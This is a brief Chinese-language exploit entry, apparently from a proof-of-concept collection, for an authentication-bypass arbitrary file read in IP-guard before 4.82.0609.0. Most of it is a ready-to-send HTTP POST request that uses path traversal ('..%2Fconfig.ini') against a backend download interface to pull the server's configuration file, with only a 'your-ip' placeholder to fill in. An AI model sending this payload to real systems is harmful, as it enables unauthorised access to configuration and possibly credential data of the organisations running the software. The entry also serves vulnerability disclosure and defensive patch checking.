**漏洞描述：**

由于权限验证机制中存在设计缺陷，攻击者能够规避安全验证，通过后端接口执行文件的任意读取操作。

**影响版本：**

IP-guard < 4.82.0609.0

**Payload：**

```yaml
POST /ipg/appr/MApplyList/downloadFile_client/getdatarecord HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded

path=..%2Fconfig.ini&filename=1&action=download&hidGuid=1v%0D%0A
```

---
